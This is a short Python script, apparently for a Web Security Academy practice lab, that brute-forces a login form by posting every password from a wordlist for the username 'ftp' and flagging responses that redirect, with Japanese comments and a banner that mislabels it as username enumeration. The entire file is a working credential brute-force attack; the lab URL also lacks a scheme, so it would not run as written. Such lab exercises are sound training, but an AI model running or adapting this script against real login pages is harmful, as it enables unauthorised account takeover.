import requests

URL = "0a1c000f04e725b280e1357600e700fe.web-security-academy.net"

with open("passwords.txt", "r") as f:
    passwords = f.read().splitlines()

print("[*] ユーザー名の列挙（Enumeration）を開始します！")

for password in passwords:
    data = {
        "username": 'ftp',
        "password": password
    }

    # リダイレクト有無を判定するため、POST後に自動追従しない
    response = requests.post(URL, data=data, allow_redirects=False, timeout=10)

    is_redirect = response.is_redirect or response.is_permanent_redirect
    location = response.headers.get("Location", "-")

    print(
        f"password: {password:15} | redirect: {is_redirect!s:5} "
        f"| status: {response.status_code} | location: {location}"
    )